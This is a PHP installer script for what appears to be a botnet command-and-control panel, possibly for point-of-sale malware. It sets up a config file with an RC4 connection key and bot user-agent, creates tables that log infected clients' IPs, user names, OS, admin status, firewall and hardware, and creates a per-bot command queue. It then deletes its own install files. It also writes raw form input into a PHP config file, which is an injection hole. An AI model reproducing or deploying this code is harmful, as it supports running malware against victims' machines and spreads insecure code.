<?php
@session_start();

if ($Pass == $Perm && $Configs2 == $Perm && $Sql == $Perm) {
    if (isset($_POST['server'])) {
        $sqluser = $_POST['sqluser'];
        if (!@mysql_connect($_POST['server'], $_POST['sqluser'], '' . $_POST['password'])) {
            $_SESSION['msj'] = "Cannot connect to the MYSQL server";
        } else {
            if (!@mysql_select_db($_POST['dbase'])) {
                $_SESSION['msj'] = "Cannot connect with the Database";
            } else {
                
                $fp = fopen('inc/config.php', 'w');
                fwrite($fp, '<?php');
                fwrite($fp, "\r\n");
                fwrite($fp, '$server = ');
                fwrite($fp, "'");
                fwrite($fp, $_POST['server']);
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$user = ');
                fwrite($fp, "'");
                fwrite($fp, $_POST['sqluser']);
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$pass = ');
                fwrite($fp, "'");
                fwrite($fp, $_POST['password']);
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$db = ');
                fwrite($fp, "'");
                fwrite($fp, $_POST['dbase']);
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$correctuser = ');
                fwrite($fp, "'");
                fwrite($fp, $_POST['user']);
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$correctpass = ');
                fwrite($fp, "'");
                fwrite($fp, md5($_POST['pass']));
                fwrite($fp, "';");
                fwrite($fp, "\r\n");
                fwrite($fp, '$usa = ');
                fwrite($fp, '"');
                fwrite($fp, $_POST['ua']);
                fwrite($fp, '";');
                fwrite($fp, "\r\n");
                fwrite($fp, '$RC4 = ');
                fwrite($fp, '"');
                fwrite($fp, $_POST['rc']);
                fwrite($fp, '";');
                fwrite($fp, "\r\n");
                fwrite($fp, 'mysql_connect($server, $user, $pass);');
                fwrite($fp, "\r\n");
                fwrite($fp, 'mysql_select_db($db);');
                fwrite($fp, "\r\n");
                fwrite($fp, '?>');
                fclose($fp);
                
                mysql_connect($_POST['server'], $_POST['sqluser'], $_POST['password']);
                mysql_select_db($_POST['dbase']);
                
                mysql_query("CREATE TABLE `clients`(
				`id` int(255) NOT NULL auto_increment,
  				`hid` varchar(255) NOT NULL,
  				`ip` varchar(45) NOT NULL,
  				`cc` varchar(3) NOT NULL,
  				`time` int(255) NOT NULL,
  				`userandpc` varchar(255) NOT NULL,
  				`admin` varchar(255) NOT NULL,
  				`os` varchar(255) NOT NULL,
  				`hst` varchar(255) NOT NULL,
  				`pos` varchar(255) NOT NULL,
  				`ky` varchar(255) NOT NULL,
				`arc` varchar(255) NOT NULL,
				`fw` varchar(255) NOT NULL,
				`user` varchar(255) NOT NULL,
				`ram` varchar(255) NOT NULL,
				`cpu` varchar(255) NOT NULL,
				`gpu` varchar(255) NOT NULL,				
				`hd` varchar(255) NOT NULL,
  				`status` varchar(255) NOT NULL,
  				PRIMARY KEY  (`id`),
  				UNIQUE KEY `ip` (`ip`)	
				) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6;");
                
                mysql_query("CREATE TABLE `commands`(
				`id` int(255) NOT NULL auto_increment,
				`hwid` varchar(255) NOT NULL,
  				`botid` int(255) NOT NULL,
  				`cmd` varchar(255) NOT NULL,
  				`variable` varchar(255) NOT NULL,
  				`viewed` int(1) NOT NULL,
  				PRIMARY KEY  (`id`)
				) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=8;");
                
                @unlink("install.php");
                @unlink("css/style-ins.css");
                @unlink("js/placeholder.js");
                echo '<meta http-equiv="refresh" content="0;URL=index.php">';
            }
        }
    }
    
} else {
    
}

$n = rand(1,6);

?>

<html>
  <head>
    <title>
      Installer
    </title>
    <link rel="stylesheet" type="text/css" href="css/style-ins.css" />
    <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js">
    </script>
    <script src="http://www.modernizr.com/downloads/modernizr-latest.js">
    </script>
    <script type="text/javascript" src="js/placeholder.js">
    </script>
  </head>
  <body>
    <form id="slick-login" method="post">
      <center>
        <img src="img/kartoxa<?echo $n;?>.png" height="150" weight="150"/>
      </center>
      <label for="username">
        username
      </label>
      <input type="text" maxlength="8" name="user" class="placeholder" placeholder="Panel User" required="required">
      <label for="username">
        Password
      </label>
      <input type="text" name="pass" class="placeholder" placeholder="Panel Password" required="required">
      <label for="username">
        useragen
      </label>
      <input type="text" name="ua" class="placeholder" placeholder="User-Agent" required="required">
      <label for="username">
        rc4key
      </label>
      <input type="text" name="rc" class="placeholder" placeholder="Connection Key" required="required">
      <label for="username">
        sqlserve
      </label>
      <input type="text" name="server" class="placeholder" placeholder="MySQL server" required="required">
      <label for="username">
        sqluser
      </label>
      <input type="text" name="sqluser" class="placeholder" placeholder="MySQL User" required="required">
      <label for="username">
        sqlpass
      </label>
      <input type="text" name="password" class="placeholder" placeholder="MySQL Password" required="required">
      <label for="username">
        dabname
      </label>
      <input type="text" name="dbase" class="placeholder" placeholder="MySQL Database" required="required">
      <input type="submit" value="Install" name="sendform">
    </form>
    <span  id="advices" style="color:#F90000">
      <?php echo $_SESSION['msj'];?>
    </span>
    <br>
  </body>
</html>